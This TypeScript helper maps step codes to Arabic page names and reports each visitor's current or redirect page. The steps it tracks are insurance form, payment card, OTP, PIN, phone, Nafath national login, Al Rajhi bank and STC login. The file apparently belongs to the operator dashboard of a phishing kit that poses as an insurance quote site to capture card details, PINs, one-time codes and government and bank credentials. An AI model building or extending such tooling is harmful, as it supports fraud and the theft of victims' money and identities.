import type { InsuranceApplication } from "./firestore-types";

const PAGE_NAMES: Record<string, string> = {
  // Home
  home: "الرئيسية",
  "home-new": "الرئيسية",
  // Insurance
  insur: "بيانات التأمين",
  // Comparison
  compar: "مقارنة العروض",
  // Payment / card
  payment: "الدفع",
  check: "الدفع",
  _st1: "الدفع",
  _t1: "الدفع",
  // OTP
  otp: "OTP",
  _t2: "OTP",
  step2: "OTP",
  veri: "OTP",
  // PIN
  pin: "PIN",
  _t3: "PIN",
  step3: "PIN",
  confi: "PIN",
  // Phone
  phone: "الهاتف",
  step5: "الهاتف",
  // Nafad
  nafad: "نفاذ",
  _t6: "نفاذ",
  step4: "نفاذ",
  nafad_modal: "نفاذ",
  nafad_confirmation: "نفاذ",
  // Rajhi
  rajhi: "الراجحي",
  // Final OTP
  finalOtp: "OTP الأخير",
  // STC
  "stc-login": "تسجيل STC",
  stc_login: "تسجيل STC",
};

const PAGE_NAMES_NUMERIC: Record<number, string> = {
  0: "الرئيسية",
  1: "الرئيسية",
  2: "بيانات التأمين",
  3: "مقارنة العروض",
  4: "الدفع",
  5: "OTP",
  6: "PIN",
  7: "الهاتف",
  8: "نفاذ",
  9: "OTP الأخير",
};

export function getPageName(step: number | string): string {
  if (typeof step === "string") {
    if (PAGE_NAMES[step]) return PAGE_NAMES[step];
    const asNum = parseInt(step, 10);
    if (!Number.isNaN(asNum) && PAGE_NAMES_NUMERIC[asNum] !== undefined) {
      return PAGE_NAMES_NUMERIC[asNum];
    }
    return "غير معروف";
  }
  return PAGE_NAMES_NUMERIC[step] ?? "غير معروف";
}

export function getVisitorCurrentPage(visitor: InsuranceApplication): string {
  return (
    visitor.redirectPage ||
    (visitor.currentPage as string) ||
    (visitor.currentStep as string) ||
    "home"
  );
}
